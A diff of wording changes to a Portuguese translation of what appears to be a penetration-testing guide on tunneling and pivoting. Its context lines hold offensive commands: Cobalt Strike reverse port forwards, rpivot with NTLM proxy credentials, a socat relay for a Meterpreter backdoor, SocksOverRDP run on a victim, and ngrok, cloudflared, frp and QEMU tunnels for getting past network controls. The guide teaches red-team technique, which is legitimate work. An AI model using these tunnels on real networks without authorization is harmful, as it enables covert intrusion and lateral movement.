@@ -156,14 +156,14 @@ rportfwd stop [bind port]
 ```
 Para notar:
 
-- O encaminhamento de porta reverso do Beacon é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
+- O **reencaminhamento de porta reversa do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para relatar entre máquinas individuais**.
 - O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-- **Privilégios de administrador não são necessários** para criar encaminhamentos de porta reversos em portas altas.
+- **Privilégios de administrador não são necessários** para criar reencaminhamentos de porta reversa em portas altas.
 
 ### rPort2Port local
 
 > [!WARNING]
-> Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
+> Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe, e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivotar através do **NTLM proxy**
+Fazer pivot através do **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter através do SSL Socat
+### Meterpreter através de SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -348,7 +348,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Você precisa ter **acesso RDP sobre o sistema**.\
 Baixe:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta utiliza `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
@@ -356,7 +356,7 @@ No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** dizendo que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
+Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
 
 **Conecte-se** via **RDP** e faça o upload e execute no computador da vítima o binário `SocksOverRDP-Server.exe`:
 ```
@@ -377,7 +377,7 @@ Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxific
 ## Bypass de proxy NTLM
 
 A ferramenta mencionada anteriormente: **Rpivot**\
-**OpenVPN** também pode contorná-lo, configurando estas opções no arquivo de configuração:
+**OpenVPN** também pode contorná-lo, configurando essas opções no arquivo de configuração:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -394,7 +394,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você configurar, por exemplo, no alvo, o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
@@ -498,7 +498,7 @@ chmod a+x ./ngrok
 
 **Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_É também possível adicionar autenticação e TLS, se necessário._
+_Também é possível adicionar autenticação e TLS, se necessário._
 
 #### Tunneling TCP
 ```bash
@@ -513,12 +513,12 @@ _É também possível adicionar autenticação e TLS, se necessário._
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Capturando chamadas HTTP
+#### Captura de chamadas HTTP
 
-_Utilizado para XSS, SSRF, SSTI ..._\
+_Util útil para XSS, SSRF, SSTI ..._\
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunelando serviço HTTP interno
+#### Tunelamento de serviço HTTP interno
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -572,11 +572,11 @@ Inicie o conector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Porque todo o tráfego sai do host **saindo pela porta 443**, os túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível.
+Porque todo o tráfego sai do host **para fora pela porta 443**, túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
+[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **Gateway de Túnel SSH**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
 
 ### Túnel TCP reverso clássico
 ```bash
@@ -622,7 +622,7 @@ qemu-system-x86_64.exe ^
 -device e1000,netdev=n0 ^
 -nographic
 ```
-• O comando acima inicia uma imagem **Tiny Core Linux** (`tc.qcow2`) na RAM.  
+• O comando acima inicia uma imagem do **Tiny Core Linux** (`tc.qcow2`) na RAM.  
 • A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro do convidado.  
 • Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; quaisquer pacotes que a alcancem são tratados pelo servidor SSH em execução na VM.  
 
